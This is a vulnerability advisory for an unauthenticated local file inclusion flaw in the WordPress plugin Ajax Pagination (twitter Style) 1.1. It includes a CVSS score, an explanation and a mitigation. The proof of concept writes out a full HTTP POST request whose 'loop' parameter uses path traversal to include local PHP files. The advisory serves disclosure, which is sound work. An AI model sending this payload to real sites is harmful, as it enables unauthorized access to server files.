Software: Ajax Pagination (twitter Style)

Homepage: http://wordpress.org/plugins/ajax-pagination/
CVSS: 9.3 (High; AV:N/AC:M/Au:N/C:C/I:C/A:C)

Description
================
End-user exploitable local file inclusion vulnerability in Ajax
Pagination (twitter Style) 1.1

Vulnerability
================
This plugin contains a file inclusion vulnerability that is exploitable
by an unauthenticated user. The user can include any local file ending
in “.php” which is accessible to the web user.

Proof of concept
================
A non-logged in user can call the ajax function
wp_ajax_nopriv_ajax_navigation that calls ajax_navigation_callback in
ajax-pagination-front.php at line 75.
By setting the value of “loop” in the POST data, they can include the
contents of that path on the returned page.
For example, to include the contents of wp-login.php in the returned
page, send the following:
POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 53
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
paged=2&action=ajax_navigation&loop=../../../wp-login


Mitigations
================
Disable the plugin until a fix is available.
